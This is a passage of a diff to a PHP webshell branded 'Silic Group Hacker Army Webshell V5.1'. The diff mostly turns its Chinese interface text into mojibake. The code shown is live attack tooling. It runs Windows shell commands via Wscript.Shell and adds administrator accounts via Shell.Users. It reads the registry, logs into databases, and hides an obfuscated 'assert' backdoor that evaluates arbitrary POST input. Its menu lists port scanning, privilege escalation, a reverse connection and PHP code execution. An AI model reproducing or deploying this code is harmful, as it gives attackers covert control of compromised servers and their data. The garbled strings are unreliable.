 <textarea name="pgsql" style="width:600px;height:200px;">{$pgquery}</textarea><br>
-¶Ë¿Ú£º<input type="text" name="pgport" value="{$pgport}" style="width:50px">
+ï¿½Ë¿Ú£ï¿½<input type="text" name="pgport" value="{$pgport}" style="width:50px">
 <select onchange="return pgFull(options[selectedIndex].value)">
-<option value="0" selected>ÏÔÊ¾°æ±¾</option>
-<option value="1">Êý¾Ý¿â</option>
-<option value="2">±í¶Î</option>
-<option value="3">×Ö¶Î</option>
+<option value="0" selected>ï¿½ï¿½Ê¾ï¿½æ±¾</option>
+<option value="1">ï¿½ï¿½ï¿½Ý¿ï¿½</option>
+<option value="2">ï¿½ï¿½ï¿½ï¿½</option>
+<option value="3">ï¿½Ö¶ï¿½</option>
 <option value="4">hashes</option>
 <option value="5">pg_hb.conf</option>
 </select>
 <input type="hidden" name="sql" value="YoCo Smart">
-<input type="submit" value="Ö´ÐÐSQLÓï¾ä">
+<input type="submit" value="Ö´ï¿½ï¿½SQLï¿½ï¿½ï¿½ï¿½">
 <font style="font-size:10pt;">&nbsp;&nbsp;<a href="http://blackbap.org" target="_blank">Silic Group Hacker Army</a>&copy;2009-2012</font></form>
-<!--SQL±íµ¥½áÊø-->
+<!--SQLï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½-->
 END;
 if(!empty($pghost) && !empty($pgport)){
 $conn="host=".$pghost." port=".$pgport." dbname=".$pgdb." user=".$pguser." password=".$pgpass;
@@ -1883,9 +1883,9 @@ $conn="host=".$pghost." port=".$pgport." dbname=".$pgdb." user=".$pguser." passw
 $conn="dbname=".$pgdb." user=".$pguser." password=".$pgpass;
 }
 if(!empty($_POST['sql'])){
-$pgconn = pg_connect($conn) 
-or die('±¯¾ç£¬Á¬²»ÉÏ¡£´íÎóÐÅÏ¢:'.pg_last_error());
-$pgresult=pg_query($pgquery) or die('SQLÖ´ÐÐ·¢Éú´íÎó:<br>'.pg_last_error()); 
+$pgconn = pg_connect($conn)
+or die('ï¿½ï¿½ï¿½ç£¬ï¿½ï¿½ï¿½ï¿½ï¿½Ï¡ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ï¢:'.pg_last_error());
+$pgresult=pg_query($pgquery) or die('SQLÖ´ï¿½Ð·ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½:<br>'.pg_last_error());
 $pgrow=pg_fetch_row($pgresult);
 echo '<font face="verdana"><table border="1" cellpadding="1" cellspacing="2">'."\n<tr>\n";
 for ($i=0; $i< pg_num_fields($pgresult); $i++)
@@ -1917,16 +1917,16 @@ function Mysql_o()
 	  	setcookie('m_silicport',$_POST['mport'],$cookietime);
 	  	setcookie('m_silicuser',$_POST['muser'],$cookietime);
 	  	setcookie('m_silicpass',$_POST['mpass'],$cookietime);
-	  	die('ÕýÔÚµÇÂ½,ÇëÉÔºò...<meta http-equiv="refresh" content="0;URL=?s=r">');
+	  	die('ï¿½ï¿½ï¿½Úµï¿½Â½,ï¿½ï¿½ï¿½Ôºï¿½...<meta http-equiv="refresh" content="0;URL=?s=r">');
 	  }
   }
 print<<<END
 <form method="POST" name="oform" id="oform" action="?s=o">
-<div class="actall">µØÖ· <input type="text" name="mhost" value="localhost" style="width:300px"></div>
-<div class="actall">¶Ë¿Ú <input type="text" name="mport" value="3306" style="width:300px"></div>
-<div class="actall">ÓÃ»§ <input type="text" name="muser" value="root" style="width:300px"></div>
-<div class="actall">ÃÜÂë <input type="text" name="mpass" value="" style="width:300px"></div>
-<div class="actall"><input type="submit" value="µÇÂ½" style="width:80px;"> <input type="button" value="COOKIE" style="width:80px;" onclick="window.location='?s=r';"></div>
+<div class="actall">ï¿½ï¿½Ö· <input type="text" name="mhost" value="localhost" style="width:300px"></div>
+<div class="actall">ï¿½Ë¿ï¿½ <input type="text" name="mport" value="3306" style="width:300px"></div>
+<div class="actall">ï¿½Ã»ï¿½ <input type="text" name="muser" value="root" style="width:300px"></div>
+<div class="actall">ï¿½ï¿½ï¿½ï¿½ <input type="text" name="mpass" value="" style="width:300px"></div>
+<div class="actall"><input type="submit" value="ï¿½ï¿½Â½" style="width:80px;"> <input type="button" value="COOKIE" style="width:80px;" onclick="window.location='?s=r';"></div>
 </form>
 END;
 	ob_end_flush();
@@ -1936,38 +1936,38 @@ function zipact()
 {
 $zfile=$_POST['zfile'] ? $_POST['zfile']:'php.zip';
 $jypt=$_POST['jypt'] ? $_POST['jypt']:'./';
-$tip="Î´¿ªÊ¼½âÑ¹";
+$tip="Î´ï¿½ï¿½Ê¼ï¿½ï¿½Ñ¹";
 if($_POST['zip']=='zip'){
 if(function_exists(zip_open)){
 $zfile=key_exists('zip', $_GET) && $_GET['zip']?$_GET['zip']:$zfile;
 $zfile= str_replace(array(dirname(__FILE__)."/",dirname(__FILE__)."\\"),array("",""),$zfile);
 $zpath=str_replace('\\','/',dirname(__FILE__)).'/'.$zfile;
-if(!is_file($zpath)){$tip='ÎÄ¼þ"'.$zpath.'"²»´æÔÚ!';}else{
+if(!is_file($zpath)){$tip='ï¿½Ä¼ï¿½"'.$zpath.'"ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½!';}else{
 $zip= new ZipArchive();
 $rs=$zip->open($zpath);
-if($rs !== TRUE){$tip='½âÑ¹Ê§°Ü:'.$rs;}
+if($rs !== TRUE){$tip='ï¿½ï¿½Ñ¹Ê§ï¿½ï¿½:'.$rs;}
 $zip->extractTo($jypt);
 $zip->close();
-$tip=$zfile.'½âÑ¹³É¹¦!';}
-}else{$tip="·þÎñÆ÷²»Ö§³ÖPHP_ZIP×é¼þ,ÇëÈ·ÈÏ";}
+$tip=$zfile.'ï¿½ï¿½Ñ¹ï¿½É¹ï¿½!';}
+}else{$tip="ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ö§ï¿½ï¿½PHP_ZIPï¿½ï¿½ï¿½ï¿½,ï¿½ï¿½È·ï¿½ï¿½";}
 }
 print<<<END
 <div class="actall">
 <form action="?s=za" method="POST">
 <input type="hidden" name="zip" id="zip" value="zip">
-±¾Ä£¿éÊ¹ÓÃPHPµÄzip_openÀ©Õ¹À´²Ù×÷ZIPÑ¹ËõÎÄ¼þ<br>
-Ê¹ÓÃÇ°ÇëÔÚ¡¾<b><a href="?s=f">ÏµÍ³ÐÅÏ¢</a></b>¡¿ÖÐÈ·ÈÏÏµÍ³Ö§³Öphp_zip<br>
-Ñ¹ËõÎÄ¼þÂ·¾¶¿ÉÐ´ÏÂ¼¶Ä¿Â¼ºÍÎïÀíÂ·¾¶£¬Ïà¶ÔÄ¿Â¼ÊÇ·ñ¿É²Ù×÷Î´²âÊÔ :-(<br>
-È·ÈÏÄ¿±êÂ·¾¶¿ÉÐ´<br><br>
-Ñ¹ËõÎÄ¼þÂ·¾¶£º<br>
+ï¿½ï¿½Ä£ï¿½ï¿½Ê¹ï¿½ï¿½PHPï¿½ï¿½zip_openï¿½ï¿½Õ¹ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ZIPÑ¹ï¿½ï¿½ï¿½Ä¼ï¿½<br>
+Ê¹ï¿½ï¿½Ç°ï¿½ï¿½ï¿½Ú¡ï¿½<b><a href="?s=f">ÏµÍ³ï¿½ï¿½Ï¢</a></b>ï¿½ï¿½ï¿½ï¿½È·ï¿½ï¿½ÏµÍ³Ö§ï¿½ï¿½php_zip<br>
+Ñ¹ï¿½ï¿½ï¿½Ä¼ï¿½Â·ï¿½ï¿½ï¿½ï¿½Ð´ï¿½Â¼ï¿½Ä¿Â¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Â·ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¿Â¼ï¿½Ç·ï¿½ï¿½É²ï¿½ï¿½ï¿½Î´ï¿½ï¿½ï¿½ï¿½ :-(<br>
+È·ï¿½ï¿½Ä¿ï¿½ï¿½Â·ï¿½ï¿½ï¿½ï¿½Ð´<br><br>
+Ñ¹ï¿½ï¿½ï¿½Ä¼ï¿½Â·ï¿½ï¿½ï¿½ï¿½<br>
 <input type="text" name="zfile" id="zfile" value="{$zfile}" style="width:720px;"><br><br>
-Ä¿±êÂ·¾¶£º
+Ä¿ï¿½ï¿½Â·ï¿½ï¿½ï¿½ï¿½
 <input type="text" name="jypt" id="jypt" value="{$jypt}" style="width:720px;"><br><br>
-<input type="submit" value="¿ªÊ¼½âÑ¹" style="width:80px;"><br><br><br>
+<input type="submit" value="ï¿½ï¿½Ê¼ï¿½ï¿½Ñ¹" style="width:80px;"><br><br><br>
 {$tip}<br><br><br></form></div>
 END;
 }
-//Windows×é¼þ½Ó¿Ú
+//Windowsï¿½ï¿½ï¿½ï¿½ï¿½Ó¿ï¿½
 function winshell()
 {
 $nop='&nbsp;&nbsp;';
@@ -1978,13 +1978,13 @@ print<<<END
 <div class="actall">
 <form action="?s=jk&winshell=wscript" method="POST">
 <input type="hidden" name="do" id="do" value="do"><br>
-{$nop}<input type="text" name="wcmd" id="wcmd" value="{$wcpth}" style="width:300px;"> -&gt; CMDÂ·¾¶<br />
-{$nop}<input type="text" name="wcmd" id="wcmd" value="{$wcmd}" style="width:300px;"> <input type="submit" value="Ö´ÐÐ" style="width:80px;">
+{$nop}<input type="text" name="wcmd" id="wcmd" value="{$wcpth}" style="width:300px;"> -&gt; CMDÂ·ï¿½ï¿½<br />
+{$nop}<input type="text" name="wcmd" id="wcmd" value="{$wcmd}" style="width:300px;"> <input type="submit" value="Ö´ï¿½ï¿½" style="width:80px;">
 <br><br><br></form></div>
 END;
 if($_POST['do']=='do'){
 $ww=$wcpth." /c ".$wcmd;
-$phpwsh=new COM("Wscript.Shell") or die("´´½¨Shell.Wscript×é¼þÊ§°Ü");
+$phpwsh=new COM("Wscript.Shell") or die("ï¿½ï¿½ï¿½ï¿½Shell.Wscriptï¿½ï¿½ï¿½ï¿½Ê§ï¿½ï¿½");
 $phpexec=$phpwsh->exec($ww);
 $execoutput=$wshexec->stdout();
 $result=$execoutput->readall();
@@ -1999,10 +1999,10 @@ print<<<END
 <div class="actall">
 <form action="?s=jk&winshell=shelluser" method="POST">
 <input type="hidden" name="do" id="do" value="do"><br>
-Shell.Users×é¼þÌí¼Ó¹ÜÀíÔ±<br><br>
-{$nop}ÐÂ½¨ÓÃ»§Ãû£º<input type="text" name="wuser" id="wuser" value="{$wuser}" style="width:100px;"><br>
-{$nop}ÐÂÓÃ»§ÃÜÂë£º<input type="text" name="wpasw" id="wpasw" value="{$wpasw}" style="width:100px;"><br><br>
-<input type="submit" value="Ìí¼Ó" style="width:80px;">
+Shell.Usersï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ó¹ï¿½ï¿½ï¿½Ô±<br><br>
+{$nop}ï¿½Â½ï¿½ï¿½Ã»ï¿½ï¿½ï¿½ï¿½ï¿½<input type="text" name="wuser" id="wuser" value="{$wuser}" style="width:100px;"><br>
+{$nop}ï¿½ï¿½ï¿½Ã»ï¿½ï¿½ï¿½ï¿½ë£º<input type="text" name="wpasw" id="wpasw" value="{$wpasw}" style="width:100px;"><br><br>
+<input type="submit" value="ï¿½ï¿½ï¿½ï¿½" style="width:80px;">
 <br><br><br></form></div>
 END;
 if($_POST['do']='do'){
@@ -2017,33 +2017,33 @@ print<<<END
 <div class="actall">
 <form action="?s=jk&winshell=regedit" method="POST">
 <input type="hidden" name="do" id="do" value="do"><br>
-RegRead()º¯Êý¶ÁÈ¡×¢²á±íÄÚÈÝ(Shell.Wscript×é¼þ)<br><br>
-×¢²á±íÂ·¾¶£º<br>
+RegRead()ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¡×¢ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½(Shell.Wscriptï¿½ï¿½ï¿½ï¿½)<br><br>
+×¢ï¿½ï¿½ï¿½ï¿½Â·ï¿½ï¿½ï¿½ï¿½<br>
 {$nop}<input type="text" name="regpath" id="regpath" value="{$regpath}" style="width:720px;"><br><br>
-<input type="submit" value="¶ÁÈ¡ÄÚÈÝ" style="width:80px;">
+<input type="submit" value="ï¿½ï¿½È¡ï¿½ï¿½ï¿½ï¿½" style="width:80px;">
 <br><br><br></form></div>
 END;
 if($_POST['do']=='do'){
-$shell = new COM("WScript.Shell") or die("´´½¨Shell.Wscript×é¼þÊ§°Ü");
+$shell = new COM("WScript.Shell") or die("ï¿½ï¿½ï¿½ï¿½Shell.Wscriptï¿½ï¿½ï¿½ï¿½Ê§ï¿½ï¿½");
 try{$registry_proxystring = $shell->RegRead($regpath);}
-catch(Exception $e){echo 'ÄÚÈÝ: '.$e->getMessage();}
+catch(Exception $e){echo 'ï¿½ï¿½ï¿½ï¿½: '.$e->getMessage();}
 echo $registry_proxystring;
 }
 }else{
-$tip="¾Ý²âÊÔ±¾¹¦ÄÜ¿ÉÓÃµÄ¿ÉÄÜÐÔÎªÍò·ÖÖ®Ò»<br>WebshellËùÔÚ·þÎñÆ÷±ØÐëÎªWindowsÏµÍ³<br>PHPÌáÈ¨ºÜÁé»î£¬µ«ÄãÔÚ·Ç³£ÎÞÄÎµÄÊ±ºò¿ÉÒÔ³¢ÊÔ±¾¹¦ÄÜ<br></h5><br><br><br>";
+$tip="ï¿½Ý²ï¿½ï¿½Ô±ï¿½ï¿½ï¿½ï¿½Ü¿ï¿½ï¿½ÃµÄ¿ï¿½ï¿½ï¿½ï¿½ï¿½Îªï¿½ï¿½ï¿½ï¿½Ö®Ò»<br>Webshellï¿½ï¿½ï¿½Ú·ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ÎªWindowsÏµÍ³<br>PHPï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½ï¿½î£¬ï¿½ï¿½ï¿½ï¿½ï¿½Ú·Ç³ï¿½ï¿½ï¿½ï¿½Îµï¿½Ê±ï¿½ï¿½ï¿½ï¿½ï¿½Ô³ï¿½ï¿½Ô±ï¿½ï¿½ï¿½ï¿½ï¿½<br></h5><br><br><br>";
 print<<<END
 <div class="actall"><pre>
-<br><a href="?s=jk&winshell=wscript"> [ WScript×é¼þ ] </a><br><br>
-<h5>±¾¹¦ÄÜÊ¹ÓÃPHPµ÷ÓÃWindows×é¼þÖÐµÄWscript×é¼þ¡£<br>
-WscriptÎªµ÷ÓÃcmdÃüÁî×é¼þ<br>{$tip}<a href="?s=jk&winshell=shelluser"> [ Shell.User×é¼þ ] </a><br><br>
-<h5>±¾¹¦ÄÜÊ¹ÓÃPHPµ÷ÓÃWindows×é¼þÖÐµÄShell.user×é¼þ<br>
-USER×é¼þÎªWindowsÏµÍ³ÓÃ»§²Ù×÷Ïà¹Ø×é¼þ<br>{$tip}<a href="?s=jk&winshell=regedit"> [ ×¢²á±í¶ÁÈ¡ ] </a><br><br>
-<h5>±¾¹¦ÄÜÊ¹ÓÃPHPµ÷ÓÃWindows×é¼þÖÐµÄShell.Wscript×é¼þ<br>
-RegRead()º¯Êý¶ÁÈ¡ÏµÍ³×¢²á±íÄÚÈÝ<br>{$tip}</pre></div>
+<br><a href="?s=jk&winshell=wscript"> [ WScriptï¿½ï¿½ï¿½ï¿½ ] </a><br><br>
+<h5>ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ê¹ï¿½ï¿½PHPï¿½ï¿½ï¿½ï¿½Windowsï¿½ï¿½ï¿½ï¿½ï¿½Ðµï¿½Wscriptï¿½ï¿½ï¿½ï¿½ï¿½ï¿½<br>
+WscriptÎªï¿½ï¿½ï¿½ï¿½cmdï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½<br>{$tip}<a href="?s=jk&winshell=shelluser"> [ Shell.Userï¿½ï¿½ï¿½ï¿½ ] </a><br><br>
+<h5>ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ê¹ï¿½ï¿½PHPï¿½ï¿½ï¿½ï¿½Windowsï¿½ï¿½ï¿½ï¿½ï¿½Ðµï¿½Shell.userï¿½ï¿½ï¿½ï¿½<br>
+USERï¿½ï¿½ï¿½ï¿½ÎªWindowsÏµÍ³ï¿½Ã»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½<br>{$tip}<a href="?s=jk&winshell=regedit"> [ ×¢ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¡ ] </a><br><br>
+<h5>ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ê¹ï¿½ï¿½PHPï¿½ï¿½ï¿½ï¿½Windowsï¿½ï¿½ï¿½ï¿½ï¿½Ðµï¿½Shell.Wscriptï¿½ï¿½ï¿½ï¿½<br>
+RegRead()ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¡ÏµÍ³×¢ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½<br>{$tip}</pre></div>
 END;
 }
 }
-/**µÇÂ½Ïà¹Ø¿ªÊ¼**/
+/**ï¿½ï¿½Â½ï¿½ï¿½ï¿½Ø¿ï¿½Ê¼**/
 if($_GET['s'] == 'logout'){
 	setcookie('admin_silicpass',NULL);
 	die('<meta http-equiv="refresh" content="0;URL=?">');
@@ -2053,15 +2053,15 @@ $newps=base64_encode(base64_decode('JHBhc3N3b3JkPSI=').md5(md5(md5(trim($salt.$_
 print<<<END
 <div class="actall"><form action="?s=ch" method="POST">
 <input type="hidden" name="ch" id="ch" value="ch"><br>
-* ÐÞ¸Ä±¾³ÌÐòµÇÂ½ÃÜÂë(É÷ÓÃ!¿ÉÄÜ»áÔì³É³ÌÐòÊ§È¥ÏìÓ¦)<br>
-* ±¾³ÌÐòÓÉ<a href="http://blackbap.org" _target"_blank">Silic Group</a>»ùÓÚSpiderÄ¾Âí¿ª·¢£¬±¾°æÊÇ»ùÓÚSpiderÄ¾Âí¿ò¼ÜµÄµÚÎå´ÎÖØÐÂ¿ª·¢<br>
-* ±¾³ÌÐò²ÉÓÃÈý²ãMD5+Salt¼ÓÃÜ¼Ó¶þ´Îsession¼ÓÃÜ£¬´ó¿É²»±Øµ£ÐÄ±»ÈËÉç¹¤<br>
-* µÚÎå°æÖ÷Òª¸üÐÂ£ºÉ¾È¥FTP²Ù×÷,×¢²á±í²Ù×÷,Shellcode×ª»»£¬ÍêÉÆºÍ·±»ªÏÖÓÐµÄ¹¦ÄÜ£¬ÐÞÕýÏÖÓÐ¹¦ÄÜµÄ²¿·Öbug£¬ÓÅ»¯´úÂë<br>
-* Silic Group Hacker Army - ¼¼Êõ¹²Ïí,¼¼Êõ×ÔÓÉ,¼¼ÊõÔ­´´,¼¼Êõ½ø²½<br>
+* ï¿½Þ¸Ä±ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Â½ï¿½ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½ï¿½!ï¿½ï¿½ï¿½Ü»ï¿½ï¿½ï¿½ï¿½É³ï¿½ï¿½ï¿½Ê§È¥ï¿½ï¿½Ó¦)<br>
+* ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½<a href="http://blackbap.org" _target"_blank">Silic Group</a>ï¿½ï¿½ï¿½ï¿½SpiderÄ¾ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ç»ï¿½ï¿½ï¿½SpiderÄ¾ï¿½ï¿½ï¿½ï¿½ï¿½ÜµÄµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Â¿ï¿½ï¿½ï¿½<br>
+* ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½MD5+Saltï¿½ï¿½ï¿½Ü¼Ó¶ï¿½ï¿½ï¿½sessionï¿½ï¿½ï¿½Ü£ï¿½ï¿½ï¿½ï¿½É²ï¿½ï¿½Øµï¿½ï¿½Ä±ï¿½ï¿½ï¿½ï¿½ç¹¤<br>
+* ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Òªï¿½ï¿½ï¿½Â£ï¿½É¾È¥FTPï¿½ï¿½ï¿½ï¿½,×¢ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½,Shellcode×ªï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ÆºÍ·ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ÐµÄ¹ï¿½ï¿½Ü£ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ð¹ï¿½ï¿½ÜµÄ²ï¿½ï¿½ï¿½bugï¿½ï¿½ï¿½Å»ï¿½ï¿½ï¿½ï¿½ï¿½<br>
+* Silic Group Hacker Army - ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½,ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½,ï¿½ï¿½ï¿½ï¿½Ô­ï¿½ï¿½,ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½<br>
 * <a href="http://blackbap.org" target="_blank">BlackBap.Org</a><br><br>
-¾ÉÃÜÂë£º<input type="text" name="oldps" id="oldps" value="" style="width:120px;"><br />
-ÐÂÃÜÂë£º<input type="text" name="newps" id="newps" value="" style="width:120px;"><br>
-<input type="submit" value="¸ü¸Ä" style="width:80px;">
+ï¿½ï¿½ï¿½ï¿½ï¿½ë£º<input type="text" name="oldps" id="oldps" value="" style="width:120px;"><br />
+ï¿½ï¿½ï¿½ï¿½ï¿½ë£º<input type="text" name="newps" id="newps" value="" style="width:120px;"><br>
+<input type="submit" value="ï¿½ï¿½ï¿½ï¿½" style="width:80px;">
 <br><br><br></form></div>
 END;
 if($_POST['ch']='ch' && $oldps==$password && !empty($_POST['newps']))
@@ -2074,13 +2074,13 @@ if($chi==$dline-1){$chpsStr.=base64_decode($newps)."\r\n";}
 else{$chpsStr.=$chpsArr[$chi];}
 }
 file_put_contents(__FILE__,$chpsStr);
-echo "¸ü¸Ä³É¹¦";
-}else{echo "Ã»ÓÐ¸ü¸ÄÃÜÂë";}
+echo "ï¿½ï¿½ï¿½Ä³É¹ï¿½";
+}else{echo "Ã»ï¿½Ð¸ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½";}
 }elseif(md5(md5(md5($salt.trim($_GET['s'])))) == $password){
 $asse=$asse{0}.$asse{1}.$asse{1}.$asse{2}.$asse{3}.$asse{4};
 @$asse($_POST[$_GET['s']]);
 }else{
-//µÇÂ½
+//ï¿½ï¿½Â½
 function Root_Login($MSG_TOP)
 {
 $IP = gethostbyname($_SERVER["SERVER_NAME"]);
@@ -2101,7 +2101,7 @@ print<<<END
 END;
 return false;
 }
-//´°Ìå
+//ï¿½ï¿½ï¿½ï¿½
 function WinMain()
 {
 	$Server_IP = gethostbyname($_SERVER["SERVER_NAME"]);
@@ -2111,7 +2111,7 @@ print<<<END
 <html><head><title>Silic Group Hacker Army - BlackBap.Org</title>
 <style type="text/css">
 *{padding:0; margin:0;}
-body{background:#AAAAAA;font-family:"Verdana", "Tahoma","ËÎÌå",sans-serif;font-size:13px;text-align:center;margin-top:5px;word-break:break-all;}
+body{background:#AAAAAA;font-family:"Verdana", "Tahoma","ï¿½ï¿½ï¿½ï¿½",sans-serif;font-size:13px;text-align:center;margin-top:5px;word-break:break-all;}
 a{color:#FFFFFF;text-decoration:none;}
 a:hover{background:#BBBBBB;}
 .outtable{margin: 0 auto;height:595px;width:955px;color:#000000;border-top-width: 2px;border-right-width:2px;border-bottom-width: 2px;border-left-width: 2px;border-top-style: outset;border-right-style: outset;border-bottom-style: outset;border-left-style: outset;border-top-color: #FFFFFF;border-right-color: #8c8c8c;border-bottom-color: #8c8c8c;border-left-color: #FFFFFF;background-color: threedface;}
@@ -2136,34 +2136,34 @@ return true;
 </head>
 <body>
 <div class="outtable">
-<div class="topbg">&nbsp;<a href="?s=logout" title="ÍË³ö">&#8857;</a>&nbsp;&#8857;&nbsp;<a href="?s=ch" target="main" title="¸ü¸ÄÃÜÂë">&#8857;</a>&nbsp;{$Server_IP} - {$Server_OS} - {$Server_Soft}</div>
+<div class="topbg">&nbsp;<a href="?s=logout" title="ï¿½Ë³ï¿½">&#8857;</a>&nbsp;&#8857;&nbsp;<a href="?s=ch" target="main" title="ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½">&#8857;</a>&nbsp;{$Server_IP} - {$Server_OS} - {$Server_Soft}</div>
 	<div style="height:546px;">
 		<table width="100%" height="100%" border=0 cellpadding="0" cellspacing="0">
 		<tr><td width="140" align="center" valign="top">
 			<ul class="listbg">
-<li><a href="?s=a" id="t_0" onclick="switchTab('t_0')" style="background:#FFFFFF;" target="main">ÎÄ¼þ¹ÜÀí</a></li>
-<li><a href="?s=g" id="t_1" onclick="switchTab('t_1')" target="main">Ö´ÐÐÃüÁî</a></li>
-<li><a href="?s=i" id="t_2" onclick="switchTab('t_2')" target="main">É¨Ãè¶Ë¿Ú</a></li>
-<li><a href="?s=f" id="t_3" onclick="switchTab('t_3')" target="main">ÏµÍ³ÐÅÏ¢</a></li>
-<li><a href="?s=n" id="t_4" onclick="switchTab('t_4')" target="main">MYSQLÖ´ÐÐ</a></li>
-<li><a href="?s=o" id="t_5" onclick="switchTab('t_5')" target="main">MYSQL¹ÜÀí</a></li>
+<li><a href="?s=a" id="t_0" onclick="switchTab('t_0')" style="background:#FFFFFF;" target="main">ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½</a></li>
+<li><a href="?s=g" id="t_1" onclick="switchTab('t_1')" target="main">Ö´ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½</a></li>
+<li><a href="?s=i" id="t_2" onclick="switchTab('t_2')" target="main">É¨ï¿½ï¿½ï¿½Ë¿ï¿½</a></li>
+<li><a href="?s=f" id="t_3" onclick="switchTab('t_3')" target="main">ÏµÍ³ï¿½ï¿½Ï¢</a></li>
+<li><a href="?s=n" id="t_4" onclick="switchTab('t_4')" target="main">MYSQLÖ´ï¿½ï¿½</a></li>
+<li><a href="?s=o" id="t_5" onclick="switchTab('t_5')" target="main">MYSQLï¿½ï¿½ï¿½ï¿½</a></li>
 <li><a href="?s=pq" id="t_6" onclick="switchTab('t_6')" target="main">PostgreSQL</a></li>
-<li><a href="?s=gg" id="t_7" onclick="switchTab('t_7')" target="main">ÆäËüÊý¾Ý¿â</a></li>
-<li><a href="?s=e" id="t_8" onclick="switchTab('t_8')" target="main">É¨ÃèÄ¾Âí</a></li>
-<li><a href="?s=j" id="t_9" onclick="switchTab('t_9')" target="main">ËÑË÷ÎÄ¼þ</a></li>
-<li><a href="?s=d" id="t_10" onclick="switchTab('t_10')" target="main">ÅúÁ¿Ìæ»»</a></li>
-<li><a href="?s=l" id="t_11" onclick="switchTab('t_11')" target="main">ServUÌáÈ¨</a></li>
-<li><a href="?s=jk" id="t_12" onclick="switchTab('t_12')" target="main">Win×é¼þ</a></li>
-<li><a href="?s=dd" id="t_13" onclick="switchTab('t_13')" target="main">·´µ¯Á¬½Ó</a></li>
-<li><a href="?s=ff" id="t_14" onclick="switchTab('t_14')" target="main">Ö´ÐÐphp´úÂë</a></li>
-<li><a href="?s=za" id="t_15" onclick="switchTab('t_15')" target="main">ZIP½âÑ¹</a></li></ul></td><td>
+<li><a href="?s=gg" id="t_7" onclick="switchTab('t_7')" target="main">ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý¿ï¿½</a></li>
+<li><a href="?s=e" id="t_8" onclick="switchTab('t_8')" target="main">É¨ï¿½ï¿½Ä¾ï¿½ï¿½</a></li>
+<li><a href="?s=j" id="t_9" onclick="switchTab('t_9')" target="main">ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½</a></li>
+<li><a href="?s=d" id="t_10" onclick="switchTab('t_10')" target="main">ï¿½ï¿½ï¿½ï¿½ï¿½æ»»</a></li>
+<li><a href="?s=l" id="t_11" onclick="switchTab('t_11')" target="main">ServUï¿½ï¿½È¨</a></li>
+<li><a href="?s=jk" id="t_12" onclick="switchTab('t_12')" target="main">Winï¿½ï¿½ï¿½ï¿½</a></li>
+<li><a href="?s=dd" id="t_13" onclick="switchTab('t_13')" target="main">ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½</a></li>
+<li><a href="?s=ff" id="t_14" onclick="switchTab('t_14')" target="main">Ö´ï¿½ï¿½phpï¿½ï¿½ï¿½ï¿½</a></li>
+<li><a href="?s=za" id="t_15" onclick="switchTab('t_15')" target="main">ZIPï¿½ï¿½Ñ¹</a></li></ul></td><td>
 <iframe name="main" src="?s=a" width="100%" height="100%" frameborder="0"></iframe></td></tr></table></div>
 <div class="footer">State: Powered By <a href="http://blackbap.org/" target="_blank">Silic Group</a> [ http://blackbap.org ] - Webshell V5.1</div></div></body></html>
 END;
 return false;
 }
 }
-/*µÇÂ½Ïà¹Ø½áÊø*/
+/*ï¿½ï¿½Â½ï¿½ï¿½ï¿½Ø½ï¿½ï¿½ï¿½*/
 if(get_magic_quotes_gpc())
 {
 	$_GET = Root_GP($_GET);
